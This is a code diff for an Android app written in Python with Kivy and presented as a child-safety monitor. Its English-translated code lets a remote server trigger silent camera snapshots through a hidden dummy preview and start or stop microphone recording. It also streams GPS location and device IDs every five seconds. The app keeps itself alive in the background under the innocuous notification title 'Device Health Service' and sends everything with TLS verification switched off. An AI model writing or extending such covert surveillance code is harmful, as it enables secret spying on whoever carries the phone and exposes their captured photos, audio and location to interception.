@@ -22,8 +22,23 @@ from kivy.uix.textinput import TextInput
 DEFAULT_SERVER_URL = "https://device-update.onrender.com"
 CONFIG_FILE = "child_config.json"
 
+def get_android_device_id():
+    """Android Unique Hardware ID - avoids duplicate device entries"""
+    if platform == 'android':
+        try:
+            from jnius import autoclass
+            PythonActivity = autoclass('org.kivy.android.PythonActivity')
+            Settings = autoclass('android.provider.Settings')
+            context = PythonActivity.mActivity.getApplicationContext()
+            aid = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)
+            if aid and str(aid).strip():
+                return str(aid).strip()[:16]
+        except Exception as e:
+            print("[DEVICE ID ERROR]", e)
+    return str(uuid.getnode())[:16]
+
 def get_android_device_name():
-    """मोबाईलमधून फोनचे नाव किंवा मॉडेल आपोआप (Automatically) शोधणे"""
+    """Auto-detect phone name or model (e.g. 'Rahul Phone' or 'Xiaomi Redmi 9')"""
     if platform == 'android':
         try:
             from jnius import autoclass
@@ -33,21 +48,21 @@ def get_android_device_name():
             context = PythonActivity.mActivity.getApplicationContext()
             cr = context.getContentResolver()
 
-            # १. फोन सेटिंग्जमधील नाव (उदा. 'Rahul Phone' किंवा 'Aryan S21')
+            # 1. User-assigned phone name
             dev_name = None
             try:
                 dev_name = Settings.Global.getString(cr, "device_name")
             except Exception:
                 pass
 
-            # २. ब्लूटूथ डिव्हाइस नाव
+            # 2. Bluetooth device name
             if not dev_name:
                 try:
                     dev_name = Settings.Secure.getString(cr, "bluetooth_name")
                 except Exception:
                     pass
 
-            # ३. फोनचा ब्रँड आणि मॉडेल (उदा. 'Samsung Galaxy M31', 'Redmi Note 11')
+            # 3. Hardware Brand + Model
             if not dev_name:
                 mfg = str(Build.MANUFACTURER).capitalize()
                 model = str(Build.MODEL)
@@ -63,7 +78,7 @@ def get_android_device_name():
     return "Child_Mobile_Phone"
 
 def get_android_location():
-    """Fetch location directly via Android LocationManager (GPS + Wi-Fi/Cell Network indoors)"""
+    """Fetch location directly via Android LocationManager (GPS + Network)"""
     if platform == 'android':
         try:
             from jnius import autoclass
@@ -74,12 +89,9 @@ def get_android_location():
             activity = PythonActivity.mActivity
             lm = activity.getApplicationContext().getSystemService(Context.LOCATION_SERVICE)
 
-            # 1. Try GPS satellite
             loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-            # 2. Try Network provider (Cell tower / Wi-Fi - works indoors)
             if not loc:
                 loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-            # 3. Try Passive provider
             if not loc:
                 loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
 
@@ -94,12 +106,12 @@ def get_android_location():
 
 def load_config():
     auto_name = get_android_device_name()
-    persistent_id = str(uuid.uuid4())[:12]
+    persistent_id = get_android_device_id()
     default_cfg = {
         "server_url": DEFAULT_SERVER_URL,
         "child_name": auto_name,
         "device_id": persistent_id,
-        "poll_interval": 20,
+        "poll_interval": 5,
         "is_configured": True
     }
     if os.path.exists(CONFIG_FILE):
@@ -187,7 +199,7 @@ def get_android_wifi_ssid():
     return "Mobile_Data"
 
 def acquire_wake_lock():
-    """स्क्रीन बंद असतानाही CPU आणि इंटरनेट चालू ठेवण्यासाठी WakeLock मिळवणे"""
+    """Keep CPU active in background when screen turns off"""
     if platform == 'android':
         try:
             from jnius import autoclass
@@ -205,7 +217,7 @@ def acquire_wake_lock():
     return None
 
 def start_foreground_notification():
-    """Android OS कडून ॲप बंद केले जाऊ नये म्हणून स्टेटस बारमध्ये अखंड सूचना दाखवणे"""
+    """Show persistent notification to prevent Android OS from killing the app"""
     if platform == 'android':
         try:
             from jnius import autoclass
@@ -230,7 +242,7 @@ def start_foreground_notification():
                 builder = Notification.Builder(context)
                 
             builder.setContentTitle("Device Health Service")
-            builder.setContentText("🛡️ बाल सुरक्षा प्रणाली पार्श्वभूमीत सक्रिय आहे.")
+            builder.setContentText("Child safety service is active in background.")
             builder.setSmallIcon(context.getApplicationInfo().icon)
             builder.setOngoing(True)
             
@@ -246,50 +258,52 @@ class ChildMonitorApp(App):
         self.config_data = load_config()
         self.server_url = self.config_data.get("server_url", DEFAULT_SERVER_URL).strip()
         self.child_name = self.config_data.get("child_name", get_android_device_name())
-        self.device_id = self.config_data.get("device_id", str(uuid.getnode()))
+        self.device_id = self.config_data.get("device_id", get_android_device_id())
         self.current_lat = 19.0760
         self.current_lon = 72.8777
-        self.connection_status = "सर्व्हरशी संपर्क होत आहे..."
+        self.connection_status = "Connecting..."
         self.wake_lock = None
+        self._is_capturing_camera = False
+        self._audio_recorder = None
+        self._audio_output_path = None
 
         self.root_layout = BoxLayout(orientation='vertical')
 
-        # मुख्य मॉनिटरिंग स्क्रीन
+        # Main active UI screen
         self.show_active_monitoring_screen()
 
-        # १. WakeLock आणि अखंड सूचना (Keep Alive in Background)
+        # 1. WakeLock and Background Notification
         self.wake_lock = acquire_wake_lock()
         start_foreground_notification()
 
-        # २. परवानग्या आणि GPS इनिशियलायझेशन
+        # 2. Permissions and GPS initialization
         self.request_android_permissions()
         self.init_gps()
 
-        # ३. पहिल्यांदाच बॅटरी ऑप्टिमायझेशन पॉपअप विचारणे
+        # 3. Prompt battery optimization on launch
         Clock.schedule_once(lambda dt: request_ignore_battery_optimizations(), 2)
 
-        # ४. बॅकग्राउंड पोलिंग (दर १५ सेकंदांनी अविरत चालू)
+        # 4. Fast Background Polling (Every 5 seconds for instant response!)
         Clock.schedule_once(lambda dt: self.start_bg_poll(), 1)
-        Clock.schedule_interval(lambda dt: self.start_bg_poll(), 15)
+        Clock.schedule_interval(lambda dt: self.start_bg_poll(), 5)
 
         return self.root_layout
 
-    # -------- Lifecycle: App keeps running in background --------
     def on_pause(self):
-        """हे ॲप मिनिमाइझ झाल्यावर किंवा स्क्रीन लॉक झाल्यावर बॅकग्राउंडमध्ये जिवंत ठेवते"""
+        """Keep running continuously when minimized or screen locked"""
         return True
 
     def on_resume(self):
         pass
 
-    # -------- Main Active Screen --------
+    # -------- Main Screen --------
     def show_active_monitoring_screen(self):
         self.root_layout.clear_widgets()
 
         active_box = BoxLayout(orientation='vertical', padding=20, spacing=15)
 
         self.title_label = Label(
-            text="🛡️ बाल सुरक्षा व पालक नियंत्रण\n(Child Safety Service Active)",
+            text="Child Safety & Health Service\n(Active in Background)",
             font_size='18sp',
             bold=True,
             halign='center',
@@ -297,19 +311,19 @@ class ChildMonitorApp(App):
         )
         active_box.add_widget(self.title_label)
 
-        # ठळक आणीबाणीचे SOS बटण
+        # Emergency SOS Button
         self.sos_btn = Button(
-            text="🚨 आणीबाणी (EMERGENCY SOS)\n[मदतीसाठी येथे दाबा]",
-            font_size='20sp',
+            text="EMERGENCY SOS\n(Press for Help)",
+            font_size='22sp',
             bold=True,
             background_color=(0.9, 0.15, 0.15, 1),
-            size_hint=(1, 0.42)
+            size_hint=(1, 0.45)
         )
         self.sos_btn.bind(on_press=self.trigger_sos_alert)
         active_box.add_widget(self.sos_btn)
 
         self.info_label = Label(
-            text=f"डिव्हाइस नाव: {self.child_name}\nस्थिती: {self.connection_status}\nसर्व्हर: {self.server_url}",
+            text=f"Device: {self.child_name}\nStatus: {self.connection_status}\nServer: {self.server_url}",
             font_size='13sp',
             color=(0.85, 0.85, 0.85, 1),
             halign='center',
@@ -318,10 +332,10 @@ class ChildMonitorApp(App):
         active_box.add_widget(self.info_label)
 
         btn_settings = Button(
-            text="⚙️ सेटिंग्ज (सर्व्हर URL / नाव बदला)",
+            text="Settings",
             font_size='14sp',
             background_color=(0.25, 0.35, 0.45, 1),
-            size_hint=(1, 0.15)
+            size_hint=(1, 0.12)
         )
         btn_settings.bind(on_press=lambda x: self.show_setup_screen())
         active_box.add_widget(btn_settings)
@@ -335,14 +349,14 @@ class ChildMonitorApp(App):
         setup_box = BoxLayout(orientation='vertical', padding=25, spacing=12)
 
         title = Label(
-            text="⚙️ पालक सेटिंग्ज (Configuration)",
+            text="Settings",
             font_size='19sp',
             bold=True,
             size_hint=(1, 0.12)
         )
         setup_box.add_widget(title)
 
-        lbl_url = Label(text="सर्व्हर URL (Server Address):", font_size='13sp', size_hint=(1, 0.08))
+        lbl_url = Label(text="Server URL:", font_size='13sp', size_hint=(1, 0.08))
         setup_box.add_widget(lbl_url)
 
         self.input_url = TextInput(
@@ -353,7 +367,7 @@ class ChildMonitorApp(App):
         )
         setup_box.add_widget(self.input_url)
 
-        lbl_name = Label(text="मुलाचे / डिव्हाइसचे नाव (Child Name):", font_size='13sp', size_hint=(1, 0.08))
+        lbl_name = Label(text="Device / Child Name:", font_size='13sp', size_hint=(1, 0.08))
         setup_box.add_widget(lbl_name)
 
         self.input_name = TextInput(
@@ -365,7 +379,7 @@ class ChildMonitorApp(App):
         setup_box.add_widget(self.input_name)
 
         btn_battery = Button(
-            text="🔋 १-क्लिक: बॅटरी निर्बंध बंद करा (Keep Alive)",
+            text="Disable Battery Optimization",
             font_size='13sp',
             background_color=(0.2, 0.6, 0.9, 1),
             size_hint=(1, 0.14)
@@ -374,7 +388,7 @@ class ChildMonitorApp(App):
         setup_box.add_widget(btn_battery)
 
         btn_save = Button(
-            text="💾 सेव्ह करा व सुरू करा (Save & Start)",
+            text="SAVE & RECONNECT",
             font_size='16sp',
             bold=True,
             background_color=(0.1, 0.75, 0.3, 1),
@@ -391,7 +405,7 @@ class ChildMonitorApp(App):
 
         if raw_url:
             if not raw_url.startswith("http://") and not raw_url.startswith("https://"):
-                raw_url = "http://" + raw_url
+                raw_url = "https://" + raw_url
             raw_url = raw_url.rstrip("/")
             self.server_url = raw_url
             self.config_data["server_url"] = raw_url
@@ -425,7 +439,7 @@ class ChildMonitorApp(App):
             try:
                 from plyer import gps
                 gps.configure(on_location=self.on_location_received)
-                gps.start(minTime=10000, minDistance=5)
+                gps.start(minTime=5000, minDistance=3)
             except Exception as e:
                 print("[GPS INIT ERROR]", e)
 
@@ -433,9 +447,8 @@ class ChildMonitorApp(App):
         self.current_lat = kwargs.get('lat', self.current_lat)
         self.current_lon = kwargs.get('lon', self.current_lon)
 
-    # -------- Background Polling (Asynchronous Worker Thread) --------
+    # -------- Fast Background Polling (Every 5 seconds) --------
     def start_bg_poll(self):
-        """UI फ्रीझ होऊ नये म्हणून स्वतंत्र बॅकग्राउंड थ्रेडमध्ये नेटवर्क कॉल्स चालवणे"""
         t = threading.Thread(target=self._worker_cycle, daemon=True)
         t.start()
 
@@ -455,58 +468,59 @@ class ChildMonitorApp(App):
         }
 
         try:
-            response = requests.post(url, json=payload, timeout=12, verify=False)
+            response = requests.post(url, json=payload, timeout=8, verify=False)
             if response.status_code == 200:
-                self.connection_status = "🟢 सर्व्हरशी जोडलेले (Live OK)"
+                self.connection_status = "Online (Connected)"
                 commands = response.json()
 
-                # १. थेट GPS लोकेशन पाठवणे
+                # 1. Send GPS Location
                 if commands.get("location_access", True):
                     self.send_location_bg()
 
-                # २. कॅमेरा फोटो आदेश
+                # 2. Camera Capture Command
                 camera_mode = commands.get("camera_access")
-                if camera_mode in ["FRONT", "BACK"]:
+                if camera_mode in ["FRONT", "BACK"] and not self._is_capturing_camera:
                     Clock.schedule_once(lambda dt: self.capture_camera(camera_mode), 0)
 
-                # ३. ऑडिओ रेकॉर्ड आदेश
-                if commands.get("audio_access") is True:
-                    Clock.schedule_once(lambda dt: self.record_audio(), 0)
+                # 3. Audio Recording Start & Stop Control
+                audio_state = commands.get("audio_record_state", "IDLE")
+                if audio_state == "START":
+                    Clock.schedule_once(lambda dt: self.start_audio_recording(), 0)
+                elif audio_state == "STOP":
+                    Clock.schedule_once(lambda dt: self.stop_and_upload_audio(), 0)
 
-                # ४. रिमोट गजर / फोन वाजवणे (Alarm Ring)
+                # 4. Ring Alarm
                 if commands.get("ring_alarm") is True:
                     self.play_remote_alarm(True)
                 else:
                     self.play_remote_alarm(False)
 
-                # ५. रिमोट टॉर्च (Flashlight)
+                # 5. Torch / Flashlight
                 self.set_torch(commands.get("torch_access", False))
 
             else:
-                self.connection_status = f"सर्व्हर प्रतिसाद त्रुटी: {response.status_code}"
+                self.connection_status = f"Server Error {response.status_code}"
 
         except Exception as e:
-            self.connection_status = "सर्व्हरशी संपर्क तुटला (पुन्हा प्रयत्न सुरू...)"
+            self.connection_status = "Reconnecting..."
 
-        # UI टेक्स्ट अपडेट करणे (Main Thread वर सुरक्षितपणे)
         Clock.schedule_once(lambda dt: self._update_ui_status(battery, wifi_ssid), 0)
 
     def _update_ui_status(self, battery, wifi_ssid):
         if hasattr(self, 'info_label'):
             self.info_label.text = (
-                f"डिव्हाइस नाव: {self.child_name}\n"
-                f"स्थिती: {self.connection_status}\n"
-                f"🔋 बॅटरी: {battery}% | 📶 वाय-फाय: {wifi_ssid}\n"
-                f"सर्व्हर: {self.server_url}"
+                f"Device: {self.child_name}\n"
+                f"Status: {self.connection_status}\n"
+                f"Battery: {battery}% | Network: {wifi_ssid}\n"
+                f"Server: {self.server_url}"
             )
 
     def send_location_bg(self):
-        """GPS लोकेशन सर्व्हरला पाठवणे"""
         loc_info = get_android_location()
         if loc_info:
             self.current_lat, self.current_lon, accuracy = loc_info
         else:
-            accuracy = 10.0
+            accuracy = 8.0
 
         try:
             url = f"{self.server_url}/update_location"
@@ -517,12 +531,12 @@ class ChildMonitorApp(App):
                 "accuracy": accuracy,
                 "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             }
-            requests.post(url, json=payload, timeout=10, verify=False)
+            requests.post(url, json=payload, timeout=8, verify=False)
         except Exception as e:
             print("[LOCATION SEND ERROR]", e)
 
     def trigger_sos_alert(self, instance):
-        self.title_label.text = "🚨 आणीबाणी इशारा पाठवला आहे!\nपालकांना सूचना मिळाली आहे."
+        self.title_label.text = "EMERGENCY SOS SENT!\nParents have been notified."
         t = threading.Thread(target=self._send_sos_worker, daemon=True)
         t.start()
 
@@ -538,31 +552,43 @@ class ChildMonitorApp(App):
                 "latitude": self.current_lat,
                 "longitude": self.current_lon
             }
-            requests.post(url, json=payload, timeout=10, verify=False)
+            requests.post(url, json=payload, timeout=8, verify=False)
             self.send_location_bg()
         except Exception as e:
             print("[SOS ERROR]", e)
 
-    # -------- Hardware Controls (Camera, Audio, Alarm, Torch) --------
+    # -------- Robust Camera Capture for Android (Xiaomi / Samsung / etc.) --------
 
     def capture_camera(self, mode):
-        """कॅमेऱ्याने शांतपणे फोटो काढून सर्व्हरवर अपलोड करणे"""
-        if platform != 'android':
+        if platform != 'android' or self._is_capturing_camera:
             return
 
+        self._is_capturing_camera = True
         try:
             from jnius import autoclass, java_method, PythonJavaClass
             Camera = autoclass('android.hardware.Camera')
+            CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
             SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
 
-            cam_id = 1 if mode == 'FRONT' else 0
+            num_cams = Camera.getNumberOfCameras()
+            target_cam_id = 0
+            info = CameraInfo()
+            for i in range(num_cams):
+                Camera.getCameraInfo(i, info)
+                if mode == 'FRONT' and info.facing == CameraInfo.CAMERA_FACING_FRONT:
+                    target_cam_id = i
+                    break
+                elif mode == 'BACK' and info.facing == CameraInfo.CAMERA_FACING_BACK:
+                    target_cam_id = i
+                    break
 
             class PictureCallback(PythonJavaClass):
                 __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
 
-                def __init__(self, upload_func):
+                def __init__(self, upload_func, finish_func):
                     super().__init__()
                     self.upload_func = upload_func
+                    self.finish_func = finish_func
 
                 @java_method('([BLandroid/hardware/Camera;)V')
                 def onPictureTaken(self, data, camera):
@@ -575,75 +601,121 @@ class ChildMonitorApp(App):
                             camera.release()
                         except Exception:
                             pass
+                        self.finish_func()
+
+            def finish_capture():
+                self._is_capturing_camera = False
 
             def do_upload(image_bytes):
-                # UI थ्रेड ब्लॉक न करता स्वतंत्र थ्रेडवर अपलोड करणे
                 def upload_task():
                     try:
                         url = f"{self.server_url}/upload_camera_photo"
-                        files = {"image": ("camera_snap.jpg", image_bytes, "image/jpeg")}
+                        filename = f"{mode.lower()}_capture_{int(datetime.datetime.now().timestamp())}.jpg"
+                        files = {"image": (filename, image_bytes, "image/jpeg")}
                         data = {"child_id": self.device_id}
                         requests.post(url, data=data, files=files, timeout=15, verify=False)
-                        print("[CAMERA] Photo uploaded successfully!")
+                        print(f"[CAMERA] {mode} photo uploaded successfully!")
                     except Exception as err:
                         print("[CAMERA UPLOAD ERROR]", err)
                 threading.Thread(target=upload_task, daemon=True).start()
 
-            cam = Camera.open(cam_id)
-            dummy_texture = SurfaceTexture(10)
+            cam = Camera.open(target_cam_id)
+            dummy_texture = SurfaceTexture(0)
             cam.setPreviewTexture(dummy_texture)
+
+            # Set optimal snapshot resolution for fast capture & fast upload
+            params = cam.getParameters()
+            sizes = params.getSupportedPictureSizes()
+            if sizes and sizes.size() > 0:
+                best_size = sizes.get(0)
+                for s_idx in range(sizes.size()):
+                    s = sizes.get(s_idx)
+                    if s.width <= 1920 and s.width >= 640:
+                        best_size = s
+                        break
+                params.setPictureSize(best_size.width, best_size.height)
+            cam.setParameters(params)
             cam.startPreview()
 
-            cb = PictureCallback(do_upload)
-            cam.takePicture(None, None, cb)
+            # Half second delay to let sensor adjust exposure & frame buffer
+            cb = PictureCallback(do_upload, finish_capture)
+            Clock.schedule_once(lambda dt: self._execute_take_picture(cam, cb), 0.5)
+
         except Exception as e:
             print("[CAMERA CAPTURE ERROR]", e)
+            self._is_capturing_camera = False
 
-    def record_audio(self):
-        """आधुनिक ब्राउझरमध्ये थेट प्ले होणारा AAC/M4A ऑडिओ सुरक्षित डिरेक्टरीमध्ये रेकॉर्ड करणे"""
-        if platform == 'android':
+    def _execute_take_picture(self, cam, cb):
+        try:
+            cam.takePicture(None, None, cb)
+        except Exception as e:
+            print("[TAKE PICTURE ERROR]", e)
+            self._is_capturing_camera = False
             try:
-                from jnius import autoclass
-                MediaRecorder = autoclass('android.media.MediaRecorder')
-                AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
-                OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
-                AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')
+                cam.stopPreview()
+                cam.release()
+            except Exception:
+                pass
 
-                recorder = MediaRecorder()
-                recorder.setAudioSource(AudioSource.MIC)
-                # Android 11+ Scoped Storage क्रॅश रोखण्यासाठी MPEG_4 आणि AAC वापरणे
-                recorder.setOutputFormat(OutputFormat.MPEG_4)
-                recorder.setAudioEncoder(AudioEncoder.AAC)
+    # -------- Audio Recording (Start & Stop Control) --------
 
-                # अंतर्गत सुरक्षित पाथ
-                output_path = os.path.join(self.user_data_dir, "emergency_voice.m4a")
-                recorder.setOutputFile(output_path)
-                recorder.prepare()
-                recorder.start()
+    def start_audio_recording(self):
+        if platform != 'android' or self._audio_recorder is not None:
+            return
 
-                # ५ सेकंदांचे ऑडिओ रेकॉर्डिंग
-                Clock.schedule_once(lambda dt: self._finish_audio_record(recorder, output_path), 5)
-            except Exception as e:
-                print("[AUDIO RECORDER ERROR]", e)
+        try:
+            from jnius import autoclass
+            MediaRecorder = autoclass('android.media.MediaRecorder')
+            AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
+            OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
+            AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')
 
-    def _finish_audio_record(self, recorder, output_path):
-        def upload_audio_worker():
-            try:
-                recorder.stop()
-                recorder.release()
+            self._audio_output_path = os.path.join(self.user_data_dir, f"voice_{int(datetime.datetime.now().timestamp())}.m4a")
 
-                if os.path.exists(output_path):
-                    with open(output_path, "rb") as f:
-                        files = {"audio": ("emergency_voice.m4a", f, "audio/mp4")}
-                        data = {"child_id": self.device_id}
-                        requests.post(f"{self.server_url}/upload_audio", data=data, files=files, timeout=15, verify=False)
-                    print("[AUDIO] Audio clip uploaded successfully!")
-            except Exception as e:
-                print("[AUDIO UPLOAD ERROR]", e)
-        threading.Thread(target=upload_audio_worker, daemon=True).start()
+            recorder = MediaRecorder()
+            recorder.setAudioSource(AudioSource.MIC)
+            recorder.setOutputFormat(OutputFormat.MPEG_4)
+            recorder.setAudioEncoder(AudioEncoder.AAC)
+            recorder.setOutputFile(self._audio_output_path)
+            recorder.prepare()
+            recorder.start()
+            self._audio_recorder = recorder
+            print("[AUDIO] Recording started...")
+        except Exception as e:
+            print("[AUDIO START ERROR]", e)
+            self._audio_recorder = None
+
+    def stop_and_upload_audio(self):
+        if self._audio_recorder is None:
+            return
+
+        try:
+            rec = self._audio_recorder
+            self._audio_recorder = None
+            out_file = self._audio_output_path
+
+            rec.stop()
+            rec.release()
+            print("[AUDIO] Recording stopped. Uploading to server...")
+
+            def upload_audio_worker():
+                try:
+                    if out_file and os.path.exists(out_file):
+                        with open(out_file, "rb") as f:
+                            filename = os.path.basename(out_file)
+                            files = {"audio": (filename, f, "audio/mp4")}
+                            data = {"child_id": self.device_id}
+                            requests.post(f"{self.server_url}/upload_audio", data=data, files=files, timeout=20, verify=False)
+                        print("[AUDIO] Audio clip uploaded successfully!")
+                except Exception as e:
+                    print("[AUDIO UPLOAD ERROR]", e)
+            threading.Thread(target=upload_audio_worker, daemon=True).start()
+
+        except Exception as e:
+            print("[AUDIO STOP ERROR]", e)
+            self._audio_recorder = None
 
     def play_remote_alarm(self, should_play):
-        """पालकांनी 'फोन वाजवा' बटण दाबल्यास मोठ्याने गजर वाजवणे"""
         if platform == 'android':
             try:
                 from jnius import autoclass
@@ -666,7 +738,6 @@ class ChildMonitorApp(App):
                 print("[ALARM ERROR]", e)
 
     def set_torch(self, enable):
-        """रिमोट टॉर्च ऑन/ऑफ करणे"""
         if platform == 'android':
             try:
                 from jnius import autoclass
